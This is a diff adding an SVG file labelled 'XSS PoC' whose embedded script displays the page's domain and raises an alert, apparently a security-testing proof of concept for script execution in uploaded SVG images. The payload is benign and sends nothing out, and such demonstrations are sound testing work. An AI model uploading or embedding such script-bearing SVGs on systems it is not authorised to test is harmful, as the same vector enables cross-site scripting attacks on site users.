@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <rect width="200" height="200" fill="#e74c3c"/>
+  <text x="100" y="90" text-anchor="middle" fill="white" font-size="16">XSS PoC</text>
+  <text x="100" y="120" text-anchor="middle" fill="white" font-size="12" id="domain"></text>
+  <script>
+    document.getElementById('domain').textContent = document.domain;
+    alert('XSS on ' + document.domain);
+  </script>
+</svg>
